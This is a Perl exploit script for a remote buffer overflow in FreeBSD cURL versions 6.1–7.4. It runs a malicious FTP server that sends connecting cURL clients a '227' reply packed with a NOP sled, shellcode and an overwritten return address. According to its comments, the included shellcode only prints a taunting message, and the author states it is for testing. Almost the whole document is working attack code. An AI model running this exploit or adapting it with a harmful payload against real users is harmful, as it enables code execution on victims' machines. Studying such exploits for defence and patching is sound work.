#!/usr/bin/perl
#
# Remote FreeBSD cURL exploit for versions 6.1 - 7.4
#
# Written by zillion (at http://www.safemode.org && http://www.xsnosoft.com)
#
# This exploit may only be used for testing purposes. More information 
# about the used vulnerability can be found on securityfocus:
#
# http://online.securityfocus.com/bid/1804
#
# The shellcode will write "Ha! Owned by a cURL!" to stdout on the system
# running cURL. The extra nops are needed because the buffer, which causes
# the overflow, is altered.
#
# $ ./curl -s ftp://xxx.xxx.xxx.xxx:21/
# Ha! Owned by a cURL! 

use IO::Socket;
use Net::hostent;

########################################################################

$shellcode = 
        "\xeb\x14\x5e\x31\xc0\x6a\x14\x56\x40\x40\x50\xb0\x04\x50\xcd".
        "\x80\x31\xc0\x40\x50\xcd\x80\xe8\xe7\xff\xff\xff\x48\x61\x21".
        "\x20\x4f\x77\x6e\x65\x64\x20\x62\x79\x20\x61\x20\x63\x55\x52".
        "\x4c\x21\x23".

         "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

while($_ = $ARGV[0], /^-/) {
    shift;       
    last if /^--$/;
    /^-p/ && do { $port = shift; };
    /^-l/ && do { $list = 1; };
    /^-o/ && do { $offset = shift; };
}


$id     = `id -u`; chop($id);
$size   =  225;
$esp    =  0xbfbffbd4;
$offset =  -140 unless $offset;
$port   =  21 unless $port;

if(!$list || $port > 1024 && $id != 0) {

print <<"TWENTE";

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+

   Usage :  $0 -l 
   Option:  $0 -p <port to listen on>
   Option:  $0 -o <offset>

   Note: low ports require root privileges

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+

TWENTE
exit;

}

for ($i = 0; $i < ($size - length($shellcode)) - 4; $i++) {
    $buffer .= "\x90";
}

$buffer .= $shellcode;
$buffer .= pack('l', ($esp + $offset)); 

print("We are using return address: 0x", sprintf('%lx',($esp - $offset)), "\n");
print "Starting to listen for incomming connections on port $port\n";

my $sock = new IO::Socket::INET (
                                 LocalPort => $port,
                                 Proto => 'tcp',
                                 Listen => 1,
                                 Reuse => 1,
                                );
die "Could not create socket: $!\n" unless $sock;

while($cl = $sock->accept()) {

   $hostinfo = gethostbyaddr($cl->peeraddr);
   printf "[Received connect from %s]\n", $cl->peerhost;
   print $cl "220 Safemode.org FTP server (Version 666) ready.\n";
   print $cl "230 Ok\n";
   print $cl "227 $buffer\n";
   sleep 2;

}
